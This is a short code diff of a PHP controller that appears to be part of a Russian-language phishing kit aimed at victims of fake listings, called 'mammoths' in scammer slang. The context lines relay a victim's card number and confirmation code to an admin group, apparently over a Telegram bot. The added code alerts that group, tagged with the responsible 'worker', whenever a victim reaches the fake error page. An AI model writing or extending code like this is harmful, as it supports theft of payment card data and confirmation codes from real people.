@@ -372,7 +372,7 @@ class PagesController extends Controller
                 "💳<b>Номер карты:</b> <code>$ccnumber</code>",
                 "🔑<b>Код подтверждения:</b> <code>$code</code>",
                 "=================",
-                "🆔<b>Номер объявления:</b> <code>{$fake->track_id}</code>",
+                "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
                 "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
                 "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
             ]);
@@ -392,6 +392,14 @@ class PagesController extends Controller
 
     public function error()
     {
+        $fake = $this->getFake();
+        if ($adminGroupId = BotController::groupAdmin('id')) $this->sendLogs($adminGroupId, [
+            "⚠️<b>Мамонт на странице Ошибки</b>",
+            "=================",
+            "🆔<b>Номер объявления:</b> <code>$fake->track_id</code>",
+            "🚛<b>Платформа:</b> <code>{$this->platform()}</code>",
+            "🐵<b>Воркер:</b> <code>{$fake->telegramUser->getName()}</code>",
+        ]);
         return view('fakes.error', ['title' => 'error | 500']);
     }
 
